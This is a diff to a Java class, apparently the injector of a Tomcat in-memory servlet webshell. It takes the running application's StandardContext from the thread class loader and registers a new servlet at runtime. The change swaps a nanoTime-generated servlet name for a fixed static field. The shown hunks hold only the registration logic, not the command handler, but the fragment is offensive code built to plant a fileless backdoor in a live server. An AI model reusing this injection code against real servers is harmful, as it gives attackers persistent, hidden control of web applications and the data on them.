@@ -15,10 +15,10 @@ public class TSMSFromThread implements Servlet {
 
 	public static String pattern;
 
+	public static String NAME;
+
 	static {
 		try {
-			String servletName = String.valueOf(System.nanoTime());
-
 			// 获取 standardContext
 			WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 
@@ -37,9 +37,9 @@ public class TSMSFromThread implements Servlet {
 			}
 
 
-			if (standardContext.findChild(servletName) == null) {
+			if (standardContext.findChild(NAME) == null) {
 				Wrapper wrapper = standardContext.createWrapper();
-				wrapper.setName(servletName);
+				wrapper.setName(NAME);
 				standardContext.addChild(wrapper);
 				Servlet servlet = new TSMSFromThread();
 
